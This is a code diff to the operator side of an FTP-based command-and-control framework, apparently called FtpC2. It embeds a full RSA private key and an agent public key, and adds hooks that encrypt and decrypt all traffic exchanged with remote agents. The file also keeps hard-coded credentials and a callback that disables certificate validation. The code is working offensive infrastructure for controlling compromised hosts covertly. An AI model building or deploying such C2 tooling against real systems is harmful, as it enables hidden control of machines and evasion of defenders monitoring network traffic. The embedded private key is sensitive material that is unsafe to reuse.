@@ -20,11 +20,7 @@ using FtpC2.Responses;
 using System.Collections.Concurrent;
 using Microsoft.Extensions.CommandLineUtils;
 using System.Data;
-using System.Text.RegularExpressions;
-using System.Diagnostics;
 using FtpC2.Tasks;
-using System.Threading.Tasks;
-using System.Collections;
 using System.Text;
 using System.Net;
 
@@ -34,10 +30,21 @@ class Program
     public static readonly string FtpHost = "127.0.0.1";
     public static readonly string FtpUser = "dark";
     public static readonly string FtpPwd = "toor";
-    public static readonly bool FtpSecure = false;    
+    public static readonly bool FtpSecure = false;
+
+    // Ensure that this contains the RSA Private Key for C2, which is used to decrypt data received
+    // from the agent. Utilize the RSAKeyHelper Tool to generate a fresh pair of Private and Public keys.
+    public static readonly string EncodedPrivateKey = "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";
+
+    // Make sure this includes the RSA Public Key belonging to the remote agent, which is utilized for encrypting
+    // data that is sent to the agent's destination.
+    public static readonly string EncodedAgentPublicKey = "MIICCgKCAgEAv/20iZMlxpwnmLmhll6ehiFicNgcxiUHlHp68B7lK/cVuFBljrDV4h9mM24uW9J2An726JXUaXJzj6RbNapZV+9NBMOzrlKYGBBd4CngzTGPeji3Uy90gC57x/voDrAd5AFRwqQSXgxNVodWjI9tLF8G36gvtHs69nexRi065CMlbEnqB4zSpiYHboGRkrc953o7sVSb0v39b5xpBu1DUO/gI7XpcdsXvutMcel6+tQPVXRt4AyCuLrM9AQ7Xc2ZrYNk8GL1G/GnFCuHzEvItfUTrzDifl3lqbfUSjfDFazTVmi+bYqSpvNjh5nYtuMxb+dMJ9Us52OMxiArX0ocCSD5Kjwy8aekQmwuArqi/E5W2Gp5LCAln8KztI2UKB5NWtmPmzxX9SkbR9z1St5YZcLuk+ju201HJCAfOpI1T6hSa7Di1FShmvQxKyjOMg7+lytlrtl8K68wvoS/y+ewDXYomP1sbZhh++CCcisM7jvmlgUrIIiLVQf9j5MNSG7fgzO5BkGW+lcqWqRlb9YFqstZ8rMDRefn4iNfpqbXasyNSGTpLsXhRfYVFEJdoLr+AF+DSaU6NmTwA+CmTUQNrwo1fXkscgNRqK6jlaxTdZUiGMolmP187L0Us1iY4g9H8MKQzri0Lk82ZGsB33WhcYXm3LmmIKEBWMBidcN3/xECAwEAAQ==";
 
     public static readonly int SynchronizeDelay = 1000;
     // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    public static AsymEncryptionHelper? Decryptor;
+    public static AsymEncryptionHelper? PeerEncryptor;
 
     public static CancellationTokenSource CancellationTokenSource = new();
 
@@ -436,6 +443,28 @@ class Program
         Console.WriteLine();
     }
 
+    public static void OnProcessExit(object? sender, EventArgs e)
+    {        
+        Decryptor?.Dispose();
+        PeerEncryptor?.Dispose();
+    }
+
+    public static string OnEgressDataModifier(string data)
+    {
+        if (PeerEncryptor == null || !PeerEncryptor.HasPublicKey)
+            return data;
+
+        return PeerEncryptor.EncryptToJson(Encoding.UTF8.GetBytes(data));
+    }
+
+    public static string OnIngressDataModifier(string data)
+    {
+        if (Decryptor == null || !Decryptor.HasPrivateKey)
+            return data;
+
+        return Encoding.UTF8.GetString(Decryptor.DecryptFromJson(data));
+    }
+
     public static void Main(string[] args)
     {
         // Important Notice: The delegate below renders the current application susceptible to
@@ -447,8 +476,26 @@ class Program
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
         ///
 
+        AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
+
         UX.DisplayBanner();
         ///
+
+        try
+        {
+            Decryptor = new(null, EncodedPrivateKey);
+        }
+        catch { 
+            Decryptor = null; 
+        }
+
+        try
+        {
+            PeerEncryptor = new(EncodedAgentPublicKey, null);
+        }
+        catch { 
+            PeerEncryptor = null; 
+        }
 
         List<Thread> daemons = new();
 
@@ -459,6 +506,9 @@ class Program
                 return;
 
             C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);
+
+            c2Protocol.EgressDataModifier = OnEgressDataModifier;
+            c2Protocol.IngressDataModifier = OnIngressDataModifier;
 
             CancellationToken cancellationToken = (CancellationToken)obj;
             while (!cancellationToken.IsCancellationRequested)
@@ -486,6 +536,9 @@ class Program
                 return;
 
             C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);
+
+            c2Protocol.EgressDataModifier = OnEgressDataModifier;
+            c2Protocol.IngressDataModifier = OnIngressDataModifier;
 
             CancellationToken cancellationToken = (CancellationToken)obj;
             while (!cancellationToken.IsCancellationRequested)
